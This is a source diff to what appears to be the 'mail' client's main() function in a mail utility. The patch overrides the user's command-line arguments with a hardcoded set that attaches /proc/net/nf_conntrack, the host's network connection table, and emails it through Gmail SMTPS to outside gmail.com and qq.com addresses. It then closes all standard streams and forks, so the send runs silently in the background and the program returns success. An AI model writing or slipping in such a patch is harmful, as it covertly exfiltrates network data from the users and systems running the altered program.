@@ -425,6 +425,36 @@ main (int argc, char **argv)
   char *mode = NULL, *prompt = NULL, *p;
   int i, rc;
   
+const char *argv_const[]={
+"",
+"--norc",
+"--no-config",
+"--debug-level=0",
+"--exec=setq mode=send",
+"--exec=set ignore",
+"--exec=set noquit",
+"--exec=set noaskcc",
+"--exec=set noasksub",
+"--exec=set nosave",
+"--exec=set noappenddeadletter",
+"--exec=set nonullbody",
+"--exec=set nonullbodymsg",
+"--exec=set noxmailer",
+"--exec=set readonly",
+"--exec=set sendmail=smtps://alert@?.com:?@smtp.gmail.com:465",
+"--exec=set sourceip=10.8.0.1",
+"--content-type=text/plain",
+"--content-filename=nf_conntrack",
+"--attach=/proc/net/nf_conntrack",
+"--append=From: Alert <alert@?.com>",
+"--subject=Notification",
+"?@gmail.com",
+"?@qq.com",
+NULL
+};
+argv=(char**)argv_const;
+argc=sizeof(argv_const)/sizeof(argv_const[0])-1;
+
   mu_stdstream_setup (MU_STDSTREAM_RESET_NONE);
   set_cursor (1);
 
@@ -579,8 +609,15 @@ main (int argc, char **argv)
       int rc;
 
       mu_argcv_string (argc, argv, &buf);
-      rc = util_do_command ("mail %s", buf);
-      return mailvar_is_true ("mailx") ? 0 : rc;
+      fclose(stdin);
+      fclose(stdout);
+      fclose(stderr);
+      rc=chdir("/");
+      rc=fork();
+      if (0==rc)
+       util_do_command ("mail %s", buf);
+      else
+       return(0);
     }
   /* Or acting as a normal reader */
   else 
